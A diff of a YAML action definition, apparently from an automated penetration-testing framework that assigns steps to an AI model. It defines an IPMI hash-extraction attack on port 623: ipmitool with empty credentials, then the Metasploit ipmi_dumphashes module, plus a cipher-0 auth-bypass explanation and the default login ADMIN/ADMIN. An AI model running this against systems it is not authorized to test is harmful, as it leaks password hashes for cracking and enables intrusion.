@@ -2,15 +2,18 @@ name: ipmi_hash
 category: services
 description: IPMI hash extraction (cipher 0 attack)
 preconditions:
-  - service.port==623
+- service.port==623
 parameters:
   target_ip: from_engagement.target_ip
-command_template: "ipmitool -I lanplus -H {target_ip} -U '' -P '' chassis status; msf 'use auxiliary/scanner/ipmi/ipmi_dumphashes'"
+command_template: ipmitool -I lanplus -H {target_ip} -U '' -P '' chassis status; msf
+  'use auxiliary/scanner/ipmi/ipmi_dumphashes'
 parser: null
 expected_effects:
-  - action_completed
+- action_completed
 falsifier:
-  pattern: "error|failed|refused|denied"
+  pattern: error|failed|refused|denied
   timeout: 30
 model_tier: haiku
-mechanism: "IPMI cipher 0 bypasses auth. RAKP protocol leaks user hashes. Metasploit ipmi_dumphashes extracts hashes for offline cracking. Common default: ADMIN/ADMIN."
+mechanism: 'IPMI cipher 0 bypasses auth. RAKP protocol leaks user hashes. Metasploit
+  ipmi_dumphashes extracts hashes for offline cracking. Common default: ADMIN/ADMIN.'
+hacktricks_ref: network-services-pentesting/623-udp-ipmi.md
